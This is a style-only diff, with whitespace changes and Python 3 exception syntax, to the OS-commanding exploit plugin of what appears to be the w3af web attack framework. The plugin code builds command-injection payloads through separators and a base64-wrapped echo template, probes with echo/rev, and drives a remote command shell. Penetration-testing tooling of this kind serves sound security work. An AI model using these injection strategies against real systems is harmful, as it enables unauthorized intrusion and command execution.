@@ -37,6 +37,7 @@ class ExploitStrategy(object):
     Base class for the different types of exploit strategies that this plugin
     can use to execute commands and get the results.
     """
+
     def __init__(self, vuln):
         self.vuln = vuln
 
@@ -44,13 +45,13 @@ class ExploitStrategy(object):
         mutant = self.vuln.get_mutant().copy()
         mutant.set_token_value(cmd)
         return opener.send_mutant(mutant)
-                
+
     def can_exploit(self, opener):
         raise NotImplementedError
 
     def generate_command(self, command):
         raise NotImplementedError
-    
+
     def extract_result(self, http_response):
         raise NotImplementedError
 
@@ -78,7 +79,7 @@ class BasicExploitStrategy(SeparatorExploitStrategy, CommonAttackMethods):
         # Define a test command:
         rand = rand_alpha(8)
         expected_output = rand + '\n'
-        
+
         if self._remote_os == 'windows':
             command = self.generate_command('echo %s' % rand)
         else:
@@ -86,20 +87,21 @@ class BasicExploitStrategy(SeparatorExploitStrategy, CommonAttackMethods):
 
         # Lets define the result header and footer.
         http_response = self.send(command, opener)
-        return self._define_exact_cut(http_response.get_body(), expected_output)
-        
+        return self._define_exact_cut(
+            http_response.get_body(), expected_output)
+
     def generate_command(self, command):
         if self._remote_os == 'windows':
             command = '%s %s' % (self._cmd_separator, command)
         else:
             command = '%s %s' % (self._cmd_separator, command)
-            
+
         return command
-    
+
     def extract_result(self, http_response):
         try:
             return self._cut(http_response.get_body())
-        except BodyCutException, bce:
+        except BodyCutException as bce:
             issue = 'https://github.com/andresriancho/w3af/issues/5139'
 
             msg = ('Unexpected exception "%s" while trying to extract the'
@@ -122,23 +124,23 @@ class FullPathExploitStrategy(SeparatorExploitStrategy):
     """
     REMOTE_CMD = "%s /bin/echo -n '%s'; %s | /usr/bin/base64 | "\
                  "/usr/bin/tr -d '\n'; /bin/echo -n '%s'"
-    
+
     def can_exploit(self, opener):
         rand = rand_alpha(8)
         cmd = self.generate_command('echo %s|rev' % rand)
-        
+
         # For some reason that I don't care about, rev adds a \n to the string
         # it reverses, even when I run the echo with "-n".
         expected_output = '%s\n' % rand[::-1]
-        
+
         http_response = self.send(cmd, opener)
         return expected_output == self.extract_result(http_response)
-        
+
     def generate_command(self, command):
         return self.REMOTE_CMD % (self._cmd_separator,
                                   shell_handler.SHELL_IDENTIFIER_1,
                                   command, shell_handler.SHELL_IDENTIFIER_2)
-    
+
     def extract_result(self, http_response):
         try:
             return shell_handler.extract_result(http_response.get_body())
@@ -208,7 +210,7 @@ class os_commanding(AttackPlugin):
     """
     EXPLOIT_STRATEGIES = [FullPathExploitStrategy, CmdsInPathExploitStrategy,
                           BasicExploitStrategy, ShellShock]
-    
+
     def __init__(self):
         AttackPlugin.__init__(self)
 
@@ -228,7 +230,7 @@ class os_commanding(AttackPlugin):
 
         Then the exploit plugin that exploits os_commanding
         (attack.os_commanding) should return ['os_commanding',] in this method.
-        
+
         If there is more than one location the implementation should return
         ['a', 'b', ..., 'n']
         """
@@ -264,19 +266,19 @@ class os_commanding(AttackPlugin):
             except KeyError:
                 om.out.debug('%s can not exploit %s' % (StrategyKlass, vuln))
                 continue
-            
+
             msg = 'Trying to exploit vuln %s using %s.'
             om.out.debug(msg % (vuln.get_id(), strategy))
-            
+
             if strategy.can_exploit(self._uri_opener):
                 om.out.debug('Success with strategy %s.' % strategy)
                 return strategy
-        
+
         om.out.debug('All strategies failed!')
-        
+
         # No strategy can exploit this vulnerability
         return False
-    
+
     def get_root_probability(self):
         """
         :return: This method returns the probability of getting a root shell
@@ -320,7 +322,7 @@ class OSCommandingShell(ExecShell):
         try:
             http_response = self.strategy.send(strategy_cmd,
                                                self.get_url_opener())
-        except BaseFrameworkException, e:
+        except BaseFrameworkException as e:
             msg = ('Error "%s" while sending HTTP request with OS command to'
                    ' remote host. Please try again.')
             return msg % e
